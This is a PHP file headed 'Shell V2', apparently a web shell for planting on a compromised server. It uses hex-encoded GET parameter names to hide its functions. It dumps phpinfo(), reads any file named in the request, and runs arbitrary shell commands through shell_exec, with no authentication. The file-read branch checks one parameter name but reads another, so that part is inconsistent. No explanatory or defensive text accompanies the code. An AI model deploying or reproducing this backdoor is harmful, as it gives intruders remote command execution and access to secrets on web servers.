<!-- Shell V2 -->
<?php

// pull system info
if (isset($_GET['\x70\x68\x70\x69\x6e\x66\x6f'])) {
    phpinfo();

    exit;
}

// read system file content
if (isset($_GET['\x70\x68\x70\x69\x6e\x69\x6e\x69'])) {
    $filename = $_GET['\x70\x68\x70\x69\x6e\x69']; // Get the filename from the request
    $phpiniContent = file_get_contents($filename); // Read the content from the specified file
    echo nl2br($phpiniContent);

    exit;
}

// execute system commands
if (isset($_GET['\x63\x6d\x64'])) {
    $output = shell_exec($_GET['\x63\x6d\x64']);
    $html = isset($_GET['\x68\x74\x6d\x6c']) ? true : false;

    if ($html === true) {
        echo "<pre>\n";
    }
    echo $output;
    if ($html === true) {
        echo "</pre>\n";
    }
    exit;
}
?>
